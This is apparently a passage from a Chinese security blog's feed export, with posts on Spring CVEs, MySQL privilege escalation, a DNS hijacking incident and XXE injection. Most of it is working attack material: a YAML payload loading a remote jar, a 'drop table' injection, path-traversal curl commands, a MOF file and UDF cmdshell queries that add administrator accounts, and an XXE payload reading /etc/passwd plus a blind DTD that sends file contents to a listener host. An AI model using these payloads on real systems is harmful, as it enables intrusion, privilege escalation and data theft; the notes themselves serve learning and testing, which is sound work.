!!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [&quot;http://artsploit.com/yaml-payload.jar&quot;]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>该jar文件的反序列化将触发提供的URLClassLoader的ScriptEngineManager构造函数的执行。jar文件可以在如下地址找到：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">https://github.com/artsploit/yaml-payload</a></p><ul><li>/env配置</li></ul><p>除了关于执行RCE的地方，还有一些设置也很有用。</p><p><strong>spring.datasource.tomcat.validationQuery = drop + table + users-</strong>允许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。</p><p><strong>spring.datasource.tomcat.url</strong> = jdbc:hsqldb:<a href="https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。" target="_blank" rel="noopener">https://localhost:3002/xdb允许您修改当前的JDBC连接字符串。</a></p><p>这种设置只在1.x中，在Spring Boot 2.x中，改为了json格式。</p><h2 id="0x23-CVE-2019-11269-Spring-Security-OAuth-开放重定向"><a href="#0x23-CVE-2019-11269-Spring-Security-OAuth-开放重定向" class="headerlink" title="0x23 CVE-2019-11269 Spring Security OAuth 开放重定向"></a>0x23 CVE-2019-11269 Spring Security OAuth 开放重定向</h2><p>此漏洞为CVE-2019-3778的延伸版本，效果一致</p><p>影响版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Spring Security OAuth 2.3至2.3.5</span><br><span class="line">Spring Security OAuth 2.2至2.2.4</span><br><span class="line">Spring Security OAuth 2.1至2.1.4</span><br><span class="line">Spring Security OAUth 2.0至2.0.17</span><br></pre></td></tr></table></figure><h2 id="0x24-CVE-2020-5398-Spring-Framework-RFD漏洞"><a href="#0x24-CVE-2020-5398-Spring-Framework-RFD漏洞" class="headerlink" title="0x24 CVE-2020-5398 Spring Framework RFD漏洞"></a>0x24 CVE-2020-5398 Spring Framework RFD漏洞</h2><blockquote><p>影响版本： Spring Framework, versions 5.2.0 to 5.2.3, 5.1.0 to 5.1.13, 5.0.0 to 5.0.16</p></blockquote><p>触发此漏洞的要求可以控制<code>content-disposition</code>文件名和扩展名来下载文件。触发的类型有些类似钓鱼文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=”https://&lt;trusted-server&gt;.com/api/users/&lt;attacker_id&gt;.cmd&quot; download&gt;</span><br><span class="line">Click me, Im a dolphin</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>先准备一个受控制的配置文件等，上传到受信的服务器中，虽然对服务器不造成影响。但是可以在其中注入一些payload。</p><p>由于下载的文件名是受前端控制，发送filename的时候可以自己构造文件名下载。</p><p>spring对不能识别的文件下载的时候按照json格式来处理，但是url仍然可以使用。</p><p>当受害者点击如上的地址时，会下载一个<attacker_id>.cmd执行文件。原来spring对这种问题的处理是添加后缀为txt来改变文件的可执行效果。</attacker_id></p><p>但是这个设置可以绕过，采用如下形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename：secure_install.cmd&quot;;</span><br></pre></td></tr></table></figure><p>会在表头中闭合造成如下效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: attachment; filename=&quot;secure_install.cmd&quot;;.txt&quot;</span><br></pre></td></tr></table></figure><p>从而达到绕过限制来下载预先设定好的可执行文件等。</p><h2 id="0x25-CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露"><a href="#0x25-CVE-2020-5405-Spring-Cloud-Config路径穿越导致的信息泄露" class="headerlink" title="0x25 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露"></a>0x25 CVE-2020-5405 Spring Cloud Config路径穿越导致的信息泄露</h2><blockquote><p>影响版本：spring-cloud-config-server &lt; 2.2.2</p></blockquote><p>[<a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md]" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring%20Cloud/CVE-2020-5405%20Spring%20Cloud%20Config%20%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/README.md]</a>(<a href="https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring" target="_blank" rel="noopener">https://github.com/mai-lang-chai/Middleware-Vulnerability-detection/blob/65bbd0ec4f2fd012318f7d91548ba1f338d5e064/Spring</a> Cloud/CVE-2020-5405 Spring Cloud Config 目录穿越/README.md)</p><p>poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">利用点1：</span><br><span class="line">curl http://127.0.0.1:9988/foo/profiles/%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftm</span><br><span class="line">p/aaa.xxx</span><br><span class="line"></span><br><span class="line">读取/User/xuanyonghao/tmp/aaa.xxx文件</span><br><span class="line">foo 对应 &#123;application&#125;</span><br><span class="line">profiles 对应 &#123;profiles&#125;</span><br><span class="line">%252f..%252f..%252f..%252fUsers%252fxuanyonghao%252ftmp 对应 &#123;label&#125;</span><br><span class="line"></span><br><span class="line">todo 条件限制：</span><br><span class="line">todo 1. 文件必须有后缀，也就是.txt等等。</span><br><span class="line">todo 2. cloud: config: server: native: search-locations: file:///tmp/&#123;label&#125;，此处的目录需要</span><br><span class="line">有&#123;application&#125;或&#123;profiles&#125;或&#123;label&#125;，因为在上述触发点会对url对应段进行替换进来location，导致目录穿越，但是会限制文件后缀</span><br><span class="line"></span><br><span class="line">利用点2：</span><br><span class="line">org.springframework.cloud.config.server.resource.ResourceController#resolveLabel(java.lang.String)</span><br><span class="line">利用此处把label处的(_)替换为/</span><br><span class="line">curl http://127.0.0.1:9988/foo/profiles/..%28_%29Users%28_%29xuanyonghao%28_%29tmp/aaa.xxx</span><br><span class="line"></span><br><span class="line">todo 条件限制：</span><br><span class="line">todo 1. 文件必须有后缀，也就是.txt等等。</span><br><span class="line">todo 2. 不像利用点1处，不需要配置&#123;application&#125;&#123;profiles&#125;&#123;label&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Spring漏洞集合&quot;&gt;&lt;a href=&quot;#Spring漏洞集合&quot; class=&quot;headerlink&quot; title=&quot;Spring漏洞集合&quot;&gt;&lt;/a&gt;Spring漏洞集合&lt;/h1&gt;&lt;p&gt;转载自&lt;a href=&quot;https://misakikata.github.
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>数据库提权</title>
    <link href="http://bai-ren-1.github.io/2020/08/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <id>http://bai-ren-1.github.io/2020/08/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/</id>
    <published>2020-08-03T13:58:36.000Z</published>
    <updated>2020-08-03T15:35:59.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><p>怕被问，就记录一下。</p><h2 id="0x00-Mysql"><a href="#0x00-Mysql" class="headerlink" title="0x00 Mysql"></a>0x00 Mysql</h2><h3 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>在windows平台下，C:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间就会以system权限执行一次。所以，只要将我们要做的事通过代码存储到这个mof文件中，就可以实现权限提升。 </p><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul><li>mysql用户具有root权限(对上面那个目录可写）</li><li>关闭了secure-file-priv</li></ul><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>准备好MOF代码，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> namespace(<span class="meta-string">"\\\\.\\root\\subscription"</span>) </span></span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123; </span><br><span class="line">EventNamespace = <span class="string">"Root\\Cimv2"</span>; </span><br><span class="line">Name  = <span class="string">"filtP2"</span>; </span><br><span class="line">    Query = <span class="string">"Select \ From __InstanceModificationEvent "</span> </span><br><span class="line">            <span class="string">"Where TargetInstance Isa \"Win32_LocalTime\" "</span> </span><br><span class="line">            <span class="string">"And TargetInstance.Second = 5"</span>; </span><br><span class="line">QueryLanguage = <span class="string">"WQL"</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">"consPCSV2"</span>; </span><br><span class="line">ScriptingEngine = <span class="string">"JScript"</span>; </span><br><span class="line">ScriptText = </span><br><span class="line">    <span class="string">"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user admin admin /add"</span>)<span class="string">"; </span></span><br><span class="line"><span class="string">&#125;; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">instance of __FilterToConsumerBinding</span></span><br><span class="line"><span class="string">&#123; </span></span><br><span class="line"><span class="string">    Consumer   = $Consumer; </span></span><br><span class="line"><span class="string">    Filter = $EventFilter; </span></span><br><span class="line"><span class="string">&#125;;</span></span><br></pre></td></tr></table></figure><p>将这个文件存储为nullevt.mof上传到任意一个你在受害机上可写的路径。然后在使用Mysql执行语句将这个MOF文件写入到C:/windows/system32/wbem/mof/中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;你上传的路径/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;;</span><br></pre></td></tr></table></figure><blockquote><p> 如果权限足够可以直接可以写到C:/windows/system32/wbem/mof/最好不过。 网上很多资料都提到win2003很容易利用，而更高版本的就很难成功了 。</p></blockquote><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限 </p><h4 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h4><ul><li>Mysql版本<strong>大于5.1</strong>版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</li><li>Mysql版本<strong>小于5.1</strong>版本udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于C:\winnt\system32。</li><li>掌握的mysql数据库的账号有对mysql的insert和delete权限以创建和抛弃函数，一般以root账号为佳，具备root账号所具备的权限的其它账号也可以。</li><li>可以将udf.dll写入到相应目录的权限。</li></ul><h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><ul><li>将dll文件导入到相应目录，如果导入错误会产生can`t open shared library错误。</li><li>创建自定义函数 ，代码如下所示：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user miao zjicmisa.org /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators miao /add&apos;);</span><br><span class="line">drop function cmdshell; // 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;// 删除函数</span><br></pre></td></tr></table></figure><blockquote><p> 注意这里的函数名应该与dll文件中的函数名一致。 </p></blockquote><ul><li></li></ul><h2 id="0x01-转载链接"><a href="#0x01-转载链接" class="headerlink" title="0x01 转载链接"></a>0x01 转载链接</h2><p><a href="https://blog.csdn.net/he_and/article/details/81434865" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/81434865</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据库提权&quot;&gt;&lt;a href=&quot;#数据库提权&quot; class=&quot;headerlink&quot; title=&quot;数据库提权&quot;&gt;&lt;/a&gt;数据库提权&lt;/h1&gt;&lt;p&gt;怕被问，就记录一下。&lt;/p&gt;
&lt;h2 id=&quot;0x00-Mysql&quot;&gt;&lt;a href=&quot;#0x00-Mysql&quot; c
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Github.io挟持</title>
    <link href="http://bai-ren-1.github.io/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/"/>
    <id>http://bai-ren-1.github.io/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/</id>
    <published>2020-07-31T02:34:13.000Z</published>
    <updated>2020-11-18T08:08:00.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Github-io挟持"><a href="#Github-io挟持" class="headerlink" title="Github.io挟持"></a>Github.io挟持</h1><p>像往常一样打开我的博客，发现github.io的都打不开了</p><h2 id="0x00-寻求解决"><a href="#0x00-寻求解决" class="headerlink" title="0x00 寻求解决"></a>0x00 寻求解决</h2><p>打开之后会提示证书有问题：</p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/1.png" alt></p><p>搜索一下发现github.io页也有别人发生一样的问题：<a href="https://www.v2ex.com/t/694065。依据里面的说法的话使用" target="_blank" rel="noopener">https://www.v2ex.com/t/694065。依据里面的说法的话使用</a> DNSCrypt  即可解决这个问题，且发生这个问题是出现了 dns 污染 。然后就去安装 DNSCrypt 啦，官网的地址如下： <a href="https://simplednscrypt.org/" target="_blank" rel="noopener">https://simplednscrypt.org/</a> </p><blockquote><p>这里的DNSCrypt其实是简易版的啦，亲测可以解决。</p></blockquote><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/2.png" alt></p><p>配置好选项后选择网卡，然后打开service按钮，即可加密DNS啦。使用之后访问博客：</p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/3.png" alt></p><p>然后要关闭服务的时候记得点一下remove service，不然可能访问不了国内的网站了：</p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/4.png" alt></p><h2 id="0x01-寻求原因"><a href="#0x01-寻求原因" class="headerlink" title="0x01 寻求原因"></a>0x01 寻求原因</h2><blockquote><p>下面如果没开启DNSCrypt会将DNS解析到本地上，明显是个错误的地址。</p></blockquote><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/5.png" alt></p><blockquote><p>开启了DNSCrypt后能解析到公网地址</p></blockquote><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/6.png" alt></p><p>开启前后返回不一样的解析结果，应该是DNS服务器被挟持了吧。结合帖子的内容应该是BGP挟持攻击了DNS服务器，然后通过DNS挟持或DNS污染来导致我们在访问博客时给我们返回错误的ip地址吧。以前好像也有挺多类似的手法：<a href="https://www.freebuf.com/articles/paper/180167.html，如下图所示：" target="_blank" rel="noopener">https://www.freebuf.com/articles/paper/180167.html，如下图所示：</a></p><p><img src="/2020/07/31/Github.io%E6%8C%9F%E6%8C%81/7.png" alt></p><h2 id="0x02-DNS挟持"><a href="#0x02-DNS挟持" class="headerlink" title="0x02 DNS挟持"></a>0x02 DNS挟持</h2><p><strong>DNS劫持</strong>一般指域名劫持。<strong>域名劫持</strong>是互联网攻击的一种方式，通过攻击域名解析服务器（DNS），或伪造域名解析服务器（DNS）的方法，把目标网站域名解析到错误的IP地址从而实现用户无法访问目标网站的目的或者蓄意或恶意要求用户访问指定IP地址的目的。</p><blockquote><p>DNS污染是DNS挟持的一种攻击形式。</p></blockquote><h2 id="0x03-DNS污染"><a href="#0x03-DNS污染" class="headerlink" title="0x03 DNS污染"></a>0x03 DNS污染</h2><p><strong>网域服务器缓存污染</strong>（DNS cache pollution），又称<strong>域名服务器缓存投毒</strong>（DNS cache poisoning），是指一些刻意制造或无意中制造出来的域名服务器数据包，把域名指往不正确的IP地址。</p><p>一般来说，在互联网上都有可信赖的网域服务器，但为减低网络上的流量压力，一般的域名服务器都会把从上游的域名服务器获得的解析记录暂存起来，待下次有其他机器要求解析域名时，可以立即提供服务。一旦有关网域的局域域名服务器的缓存受到污染，就会把网域内的计算机导引往错误的服务器或服务器的网址。</p><h2 id="0x04-防止"><a href="#0x04-防止" class="headerlink" title="0x04 防止"></a>0x04 防止</h2><p>使用DNSCrypt对DNS请求进行加密，就可以防止DNS挟持/污染啦。使用方法就和上面写的是一样的。</p><h2 id="0x05-更新"><a href="#0x05-更新" class="headerlink" title="0x05 更新"></a>0x05 更新</h2><p>新的解决方法，使用DNS服务器:114.114.114.114</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><ul><li><a href="https://www.v2ex.com/t/694065" target="_blank" rel="noopener">https://www.v2ex.com/t/694065</a></li><li><a href="https://www.freebuf.com/articles/paper/180167.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/paper/180167.html</a></li><li><a href="https://www.williamlong.info/archives/3890.html" target="_blank" rel="noopener">https://www.williamlong.info/archives/3890.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Github-io挟持&quot;&gt;&lt;a href=&quot;#Github-io挟持&quot; class=&quot;headerlink&quot; title=&quot;Github.io挟持&quot;&gt;&lt;/a&gt;Github.io挟持&lt;/h1&gt;&lt;p&gt;像往常一样打开我的博客，发现github.io的都打不开了&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="http://bai-ren-1.github.io/2020/07/29/XXE/"/>
    <id>http://bai-ren-1.github.io/2020/07/29/XXE/</id>
    <published>2020-07-29T04:48:33.000Z</published>
    <updated>2020-09-05T05:27:58.076Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>本来从来没想过记录这些基础漏洞的使用方法，但这个XXE老是临到用时就忘记，就记一记吧。危害一般都是读文件、内网端口探测、攻击内网网站等 。</p><h2 id="0x00-外部实体"><a href="#0x00-外部实体" class="headerlink" title="0x00  外部实体"></a>0x00  外部实体</h2><p>XML文档结构包括：</p><ul><li>XML声明</li><li>DTD文档类型定义（可选）</li><li>文档元素</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为"#PCDATA"类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面是一份完整的XML文档定义，具有XML声明、DTD文档类型定义和文档元素三部分。上面已经展示的很直观了不多解释。</p></blockquote><p>进行XXE攻击第一步先<strong>声明XML声明</strong>，然后进行<strong>DTD文档类型的声明</strong>。</p><ul><li>内部声明DTD:</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span></span><br></pre></td></tr></table></figure><ul><li>引用外部DTD:</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 SYSTEM "文件名"&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p> 可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。 </p></blockquote><p>其中需要知道DTD中的一些重要的关键字：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><p>XXE叫做XML外部实体注入，我们直接看如何在外部DTD文档声明中<strong>声明实体</strong>：</p><p>其中关于实体，用到最多的类型是<strong>一般实体</strong>和<strong>参数实体</strong></p><ul><li>一般实体的声明： </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>参数实体的声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>上面我们是了解不同实体之间符号的区别，主要在于格式。XXE关键还是下面的内外部实体的区分。</p></blockquote><ul><li>内部实体声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>外部实体声明：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><p>所以区分内/外部实体和区分内/外部DTD是一样的，有SYSTEM标识符就是外部的，否则为内部的。</p></blockquote><p>只要如何声明实体后我们还得知道如何<strong>引用实体</strong>：</p><ul><li>参数实体用%实体名称申明，引用时也用%实体名称。</li><li>其余实体直接用实体名称申明，引用时用&amp;实体名称。</li><li>参数实体只能在DTD中申明，DTD中引用。</li><li>其余实体只能在DTD中申明，可在xml文档中引用。 </li></ul><p>最后贴上外部实体在每种不同的环境下默认可以<strong>使用的协议</strong>列表。</p><p><img src="/2020/07/29/XXE/1.png" alt></p><p>结合着上面知识来一个XXE的最常见payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [&lt;!ENTITY passwd SYSTEM "file:///etc/passwd"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;passwd;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>上面先是声明是个XML文档，随后声明一个内部DTD文档。DTD文档中通过SYSTEM标识符声明了一个外部实体passwd。然后XML文档元素中通&amp;进行外部实体的引用。</p></blockquote><h2 id="0x01-基础攻击"><a href="#0x01-基础攻击" class="headerlink" title="0x01 基础攻击"></a>0x01 基础攻击</h2><blockquote><p>基础的XXE注入— 外部实体注入本地DTD。</p></blockquote><p>下面这张图片用的是一个挺有名的XXE测试靶场，懒得复现就直接提上来。这里就是直接引入一个内部DTD，里面声明了外部实体获取/etc/passwd/的内容然后解析出来并获取解析的结果。</p><p><img src="/2020/07/29/XXE/2.png" alt></p><p>但很多时候解析之后的结果不会给你看到，那就需要盲注的手法了。</p><h2 id="0x02-盲注攻击"><a href="#0x02-盲注攻击" class="headerlink" title="0x02 盲注攻击"></a>0x02 盲注攻击</h2><blockquote><p>基于盲注的XXE注入—XML解析器在响应中不显示任何错误。</p></blockquote><p>首先在自己的VPS上准备好test.dtd作为一会引入的外部dtd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>在XXE漏洞服务器上发送payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>然后在VPS的9999端口监听，获取到敏感信息的内容</p><p><img src="/2020/07/29/XXE/3.png" alt></p><p>总结上面XXE盲打的调用过程：</p><ul><li>payload中连续调用了三个参数实体 %remote;%int;%send。</li><li>调用%remote实体后请求了VPS上的 test.dtd ，类似于将 test.dtd 包含进来。</li><li>调用%int实体调用了test.dtd 中的%file实体，%file实体获取文件内容并填入到%send实体的内容中。</li><li>调用%send实体把需要的数据发送到VPS的监听端口上。</li></ul><h2 id="0x03-显错攻击"><a href="#0x03-显错攻击" class="headerlink" title="0x03 显错攻击"></a>0x03 显错攻击</h2><blockquote><p>基于错误的XXE注入—成功解析之后，XML解析器始终显示SAME响应。（即“您的消息已被接收”），因此，我们可能希望解析器将文件的内容“打印”到错误响应中。</p></blockquote><p>有时候，当解析过程成功时，当我们从服务器得到通用的响应时，我们可能希望服务器返回详细错误—因此，我们可以使用与远程DTD相同的技术，但会发生故意的错误如： </p><p><img src="/2020/07/29/XXE/4.png" alt></p><p>解析器将尝试解析DTD并访问发送实体中给出的路径，但是由于不能到达“my-evil-domain.$$$$”，我们将导致以下错误： </p><p><img src="/2020/07/29/XXE/5.png" alt></p><h2 id="0x04-链接"><a href="#0x04-链接" class="headerlink" title="0x04 链接"></a>0x04 链接</h2><ul><li><a href="https://www.secpulse.com/archives/58915.html" target="_blank" 